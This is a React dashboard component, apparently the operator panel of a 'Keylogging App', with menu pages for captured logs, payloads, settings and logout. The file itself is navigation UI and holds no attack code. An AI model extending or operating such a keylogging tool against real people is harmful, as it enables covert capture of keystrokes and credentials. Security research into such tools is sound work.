import React, { useContext, useState } from 'react';

import { ChevronDownIcon } from '@chakra-ui/icons';
import {
  Box,
  Button,
  Menu,
  MenuButton,
  MenuItem,
  MenuList,
  Stack,
  Heading,
} from '@chakra-ui/react';
import capitalize from 'lodash/capitalize';

import { AuthContext } from '../authContext';

import Logs from './Logs';
import Payload from './Payloads';
import Settings from './Settings';

const PAGE_OPTIONS = ['logs', 'payloads', 'settings', 'logout'];

const Dashboard = () => {
  const { onLogout } = useContext(AuthContext);
  const [selectedPage, setSelectedPage] = useState(
    localStorage.getItem('selectedPage') || 'logs',
  );

  const onChangePage = ({ target: { value } }) => {
    if (value !== 'logout') {
      localStorage.setItem('selectedPage', value);
    }
    setSelectedPage(value);
  };

  const renderPage = () => {
    switch (selectedPage) {
      case 'payloads':
        return <Payload />;
      case 'settings':
        return <Settings />;
      case 'logout':
        onLogout();
        return null;
      default:
        return <Logs />;
    }
  };

  return (
    <Stack>
      <Box
        display="flex"
        flexDirection="row"
        justifyContent="space-between"
        padding="20px"
      >
        <Heading>Keylogging App</Heading>
        <Menu>
          <MenuButton
            as={Button}
            key={`page-${selectedPage}`}
            rightIcon={<ChevronDownIcon />}
          >
            {capitalize(selectedPage)}
          </MenuButton>
          <MenuList>
            {PAGE_OPTIONS.map(option => (
              <MenuItem onClick={onChangePage} value={option}>
                {capitalize(option)}
              </MenuItem>
            ))}
          </MenuList>
        </Menu>
      </Box>
      {renderPage()}
    </Stack>
  );
};

export default Dashboard;
